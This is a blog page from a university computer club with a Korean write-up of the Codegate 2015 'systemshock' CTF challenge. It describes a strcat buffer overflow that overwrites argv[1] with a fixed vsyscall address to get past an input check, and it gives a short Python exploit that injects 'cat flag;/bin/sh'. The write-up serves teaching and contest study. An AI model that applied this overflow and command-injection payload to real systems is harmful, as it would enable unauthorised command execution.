@@ -1,0 +1,699 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  <link href='//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="UNIST Computer Club. Hacker's eXciting Academy" />
+
+    <meta property="og:image" content="https://raw.githubusercontent.com/HeXA-UNIST/hexa-blog/master/source/img/hexa_logo.png" />
+
+
+  <meta name="keywords" content="l34p,codegate,ctf,writeup," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다. 
+문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 shellshock인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ실제로 당황스럽게도 대회 서버에서 CVE-2014-6277이 먹혔더라죠… ;;
+하지만 차분히 생각해보면 shellshock는 setuid가 걸려있는 바이너리안에서 b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Codegate 2015 - systemshock">
+<meta property="og:url" content="http://hexa-unist.github.io/2015/04/06/Codegate-2015-systemshock/index.html">
+<meta property="og:site_name" content="HeXA | UNIST Computer Club">
+<meta property="og:description" content="200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다. 
+문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 shellshock인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ실제로 당황스럽게도 대회 서버에서 CVE-2014-6277이 먹혔더라죠… ;;
+하지만 차분히 생각해보면 shellshock는 setuid가 걸려있는 바이너리안에서 b">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock1.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock2.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock3.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock4.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock5.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock6.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock7.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock8.png">
+<meta property="og:updated_time" content="2016-11-30T06:03:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Codegate 2015 - systemshock">
+<meta name="twitter:description" content="200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다. 
+문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 shellshock인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ실제로 당황스럽게도 대회 서버에서 CVE-2014-6277이 먹혔더라죠… ;;
+하지만 차분히 생각해보면 shellshock는 setuid가 걸려있는 바이너리안에서 b">
+<meta name="twitter:image" content="http://hexa-unist.github.io/img/systemshock1.png">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'hide'
+  };
+</script>
+
+  <title> Codegate 2015 - systemshock | HeXA | UNIST Computer Club </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">HeXA</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-members">
+          <a href="/members" rel="section">
+            <i class="menu-item-icon icon-next-members"></i> <br />
+            Members
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-seminar">
+          <a href="/seminar" rel="section">
+            <i class="menu-item-icon icon-next-seminar"></i> <br />
+            Seminar
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            Tags
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              Codegate 2015 - systemshock
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on
+          <time itemprop="dateCreated" datetime="2015-04-06T12:20:08+09:00" content="2015-04-06">
+            2015-04-06
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2015/04/06/Codegate-2015-systemshock/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/04/06/Codegate-2015-systemshock/" itemprop="commentsCount"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p>200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다. </p>
+<p>문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ<br>실제로 당황스럽게도 대회 서버에서 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6277" target="_blank" rel="external">CVE-2014-6277</a>이 먹혔더라죠… ;;</p>
+<p>하지만 차분히 생각해보면 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>는 <code>setuid</code>가 걸려있는 바이너리안에서 <code>bash</code>를 호출해야한다는 점과 환경변수를 필요로 한다는점을 생각해보면 이 문제에서는 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>를 사용할 수 없다는걸 바로 알 수 있습니다.</p>
+<p>이걸 생각못해서 날린 시간이 몇시간인지.. 흙흙</p>
+<p>여튼, 이 문제는 <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="external">shellshock</a>를 이용해서 푸는 문제가 아닌 strcat을 이용한 단순한 오버플로우 문제입니다. 제대로 된 풀이만 바로 떠올리면 정말 빨리 풀 수 있는 문제이지요… 실제로 문제가 나오자마자 엄청 빠른 속도로 풀린 문제이기도 합니다.</p>
+<p>그럼 각설하고 풀이로 들어가보도록 하겠습니다!</p>
+<h2 id="문제환경"><a href="#문제환경" class="headerlink" title="문제환경"></a>문제환경</h2><p align="center"> <img src="/img/systemshock1.png" style="width: 90%;"> </p>
+
+<p>오호 정확히 <code>strlen</code>의 인자로 넣어준 A들이 들어간것을 볼 수 있습니다.</p>
+<p>그럼 이제 해야할것은 <code>argv[1]</code>의 포인터를 덮어씌우기 위해 앞에 몇개의 A를 넣어줘야하는지와 어떤 값으로 덮어써야할지를 정하면 되겠습니다.</p>
+<p>어떤값으로 덮어써야할지는 비어있는 문자열 즉 null이 들어있는 주소로 덮어주면 됩니다. 그러면 <code>strlen</code>의 리턴값이 0이 되고, 입력값 검사를 우회할수 있게 됩니다. 그런데 여기서 또 생각해 줘야할 부분이 서버에는 ASLR이 걸려있어 주소들이 랜덤이고 32비트가 아니라 ulimit -s unlimited 같은 꼼수도 못부립니다 ㅠㅠ.. 하지만! 64비트에도 고정인 주소가 있으니… 바로 그부분은 vsyscall 영역입니다.</p>
+<p align="center"> <img src="/img/systemshock2.png" style="width: 80%;"> </p>
+
+<p>끝부분에 보이는 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0xffffffffff600000    0xffffffffff601000 r-xp      [vsyscall]</div></pre></td></tr></table></figure>
+<p>부분은 ASLR이 걸려있더라도 고정인 주소로 매핑됩니다. 그렇다면 이 vsyscall 영역에 null이 들어있는 주소가있다면?! 그 주소로 <code>strlen</code>의 인자, 즉 argv[1]의 포인터를 덮어씌우면 끝나게 됩니다.</p>
+<p>그러면 이제 이 vsyscall 영역에 null문자열이 있는지 한번 찾아봅시다.</p>
+<p align="center"> <img src="/img/systemshock3.png" style="width: 90%;"> </p>
+
+<p>찾는방법은 여러가지 있겠으나 저는 peda의 searchmem 기능을 이용하여 찾았습니다.<br>vsyscall 영역에서 null(0x00) 으로 찾으니 꽤 많이 나오는데 이 중에서 값의 중간에 0x00 널값이 포함안되는 값으로 아무거나 하나 정해주면됩니다.</p>
+<p>null이 들어가면 안되는 이유는 문제 바이너리를 실행할때 인풋을 argv[1]로 넘겨주는데 이 argv[1]은 중간에 null값이 들어갈 수 없기 때문입니다. ( null 값이 들어가면 null뒤의 값들은 짤립니다.. ㅠㅠ )</p>
+<p>여튼 그럼 저는 적당히 0xffffffffff600405 로 골라서 하도록 하겠습니다.</p>
+<p>이제 남은일은 앞에 더미값인 A를 몇개나 입력해줘야하는가 인데, 자세히 분석해서 알아낼 수도 있겠지만 대회 특성상 문제를 빨리풀어야하는걸 고려해서 peda의 pattern 명령어를 사용하여 자세히 분석하지 않고도 쉽게 알아낼수 있는 방법을 쓰도록 하겠습니다.</p>
+<p align="center"> <img src="/img/systemshock4.png" style="width: 85%;"> </p>
+
+<p>pattern create 1024 pattern.txt 를 입력하면 pattern.txt 라는 파일에 1024개의 패턴 문자가 쓰여지게 됩니다.<br>그리고 실행할때 r <code>cat pattern.txt</code> 로 실행을 하면 방금 만든 pattern 값들을 argv[1]로 넘기면서 실행할 수 있습니다.</p>
+<p>이렇게 실행을 하면,</p>
+<p align="center"> <img src="/img/systemshock5.png" style="width: 85%;"> </p>
+
+<p>이렇게 <code>strlen</code>의 인자가 패턴값으로 덮힌것을 알 수 있습니다.</p>
+<p>이상태에서 pattern.txt 파일을 열어 ANsA8sAi 의 문자열을 찾아 ( 리틀엔디안이므로 문자열을 뒤집은 것입니다. ) 이 문자열앞의 문자 갯수를 python len 함수같은것을 이용하여 세어봐도 되고, peda의 pattern search 라는 기능을 이용해도 됩니다.</p>
+<p align="center"> <img src="/img/systemshock6.png" style="width: 85%;"> </p>
+
+<p>pattern search를 해보면 offset이 525로 나오는데 이게 우리가 구할 offset과 일치합니다.</p>
+<p>이렇게 offset을 구했으니 “A” 525개 + “B” 8개 를 넣어서 offset이 맞는지 한번 확인해보도록 하겠습니다.</p>
+<p align="center"> <img src="/img/systemshock7.png" style="width: 90%;"> </p>
+
+<p><code>strlen</code>에 breakpoint를 걸은후, <code>perl -e&#39;print&quot;A&quot;x525, &quot;B&quot;x8&#39;</code> 로 실행시키면 정확히 <code>strlen</code>의 인자로 BBBBBBBB가 들어가는것을 볼 수 있습니다.</p>
+<p>그럼 이제 BBBBBBBB 부분 대신에 아까 구해준 null이 들어있는 주소,  0xffffffffff600405 으로 대신 넣어주고 “A”525개에 A만 넣는게 아니라 실행시킬 명령어도 포함시켜 주면 입력값 검사를 안받게되고 임의의 명령어를 실행시킬수 있게 됩니다.</p>
+<h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># exploit.py</span></div><div class="line"><span class="comment"># ./shock "`cat payload`"</span></div><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line"></div><div class="line">f = open(<span class="string">"payload"</span>, <span class="string">"w"</span>)</div><div class="line"></div><div class="line">null_addr=<span class="number">0xffffffffff600405</span></div><div class="line">cmd=<span class="string">"HACKED;cat flag;/bin/sh;#"</span></div><div class="line"></div><div class="line">payload = cmd + <span class="string">"A"</span>*(<span class="number">525</span>-len(cmd))</div><div class="line">payload+= pack(<span class="string">"&lt;Q"</span>, null_addr)</div><div class="line"></div><div class="line">f.write(payload)</div><div class="line">f.close()</div></pre></td></tr></table></figure>
+<p><img src="/img/systemshock8.png" alt=""></p>
+<p>궁금한부분이 있거나 수정할 부분이 있으면 언제든 말해주세요!</p>
+<p>작성자: <a href="https://github.com/L34p/" target="_blank" rel="external">l34p</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/l34p/" rel="tag">#l34p</a>
+          
+            <a href="/tags/codegate/" rel="tag">#codegate</a>
+          
+            <a href="/tags/ctf/" rel="tag">#ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag">#writeup</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/08/04/XSS-subdomain-escape-wirte-up-on-Dropbox/" rel="prev">XSS subdomain escape wirte up (on Dropbox)</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/02/27/club-auto-system/" rel="next">동아리 활동 내역서 자동 생성 사이트</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/img/hexa_logo.png" alt="HeXA" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">HeXA</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">UNIST Computer Club. Hacker's eXciting Academy</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">7</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">0</span>
+              <span class="site-state-item-name">categories</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">14</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#문제환경"><span class="nav-number">1.</span> <span class="nav-text">문제환경</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-Code"><span class="nav-number">2.</span> <span class="nav-text">Exploit Code</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HeXA</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+    
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'hexa-unist';
+      var disqus_identifier = '2015/04/06/Codegate-2015-systemshock/';
+      var disqus_title = 'Codegate 2015 - systemshock';
+      var disqus_url = 'http://hexa-unist.github.io/2015/04/06/Codegate-2015-systemshock/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        console.log((document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq));
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
